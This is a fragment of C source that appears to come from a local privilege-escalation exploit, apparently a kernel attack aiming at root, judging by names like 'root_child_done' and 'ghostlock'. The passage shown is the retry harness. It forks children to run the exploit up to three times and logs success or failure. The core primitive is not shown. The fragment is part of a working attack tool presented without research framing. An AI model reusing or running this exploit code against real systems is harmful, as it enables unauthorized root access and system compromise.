  return root_child_done != 0;
}

#define EXPLOIT_MAX_ATTEMPTS 3

int run_exploit(int argc, char **argv) {
  (void)argc;
  (void)argv;

  for (int attempt = 1; attempt <= EXPLOIT_MAX_ATTEMPTS; attempt++) {
    /* Reset per-attempt diagnostics. Each primitive invocation obtains a
     * distinct lock from its freshly reclaimed payload page. */
    ghostlock_reset_attempt_state();
    pr_info("exploit attempt %d/%d starting pid=%d\n",
            attempt, EXPLOIT_MAX_ATTEMPTS, getpid());
    pid_t child = fork();
    if (child == 0) {
      int ok = run_exploit_once();
      _exit(ok ? 0 : 1);
    }
    if (child < 0) {
      pr_error("exploit retry fork failed errno=%d\n", errno);
      return 1;
    }
    int status = 0;
    while (waitpid(child, &status, 0) < 0 && errno == EINTR) {
    }
    if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
      pr_success("exploit attempt %d/%d SUCCESS\n", attempt, EXPLOIT_MAX_ATTEMPTS);
      return 0;
    }
    pr_warning("exploit attempt %d/%d failed status=%d; retrying\n",
               attempt, EXPLOIT_MAX_ATTEMPTS, status);
    usleep(500000);
  }
  pr_error("exploit failed after %d attempts\n", EXPLOIT_MAX_ATTEMPTS);
  return 1;
}
